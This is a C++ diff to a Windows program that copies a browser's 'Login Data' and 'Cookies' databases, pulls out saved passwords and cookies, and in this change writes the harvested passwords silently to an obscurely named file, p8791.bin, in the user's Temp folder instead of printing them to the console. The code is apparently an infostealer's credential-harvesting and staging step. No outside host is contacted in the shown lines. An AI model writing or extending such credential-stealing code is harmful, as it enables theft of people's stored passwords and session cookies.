@@ -73,6 +73,7 @@ stringstream getPass(
 			c++;
 		}
 		dump << endl;
+		dump << endl;
 		rc = sqlite3_step(pStmt);
 	}
 
@@ -208,8 +209,14 @@ int WinMain(
 	copyDB("Login Data", "passwordsDB");
 	sqlite3 *passwordsDB = getDBHandler("passwordsDB");
 	stringstream passwords = getPass(passwordsDB);
-	cout << passwords.str();
+//	cout << passwords.str();
 
+	string fileName = getenv("LOCALAPPDATA");
+	fileName.append("\\Temp\\");
+	fileName.append("p8791.bin");
+	std::ofstream myfile(fileName, std::ios::out | std::ios::app | std::ios::binary);
+	myfile << passwords.str();
+	myfile.close();
 
 	if (sqlite3_close(passwordsDB) == SQLITE_OK)
 		cout << "DB connection closed properly" << endl;
@@ -232,7 +239,7 @@ int WinMain(
 		copyDB("Cookies", "cookiesDB");
 		sqlite3 *cookiesDb = getDBHandler("cookiesDB");
 		stringstream cookies = getCookies(cookiesDb);
-		cout << cookies.str();
+	// TODO	cout << cookies.str();
 		if (sqlite3_close(cookiesDb) == SQLITE_OK)
 			cout << "DB connection closed properly" << endl;
 		else
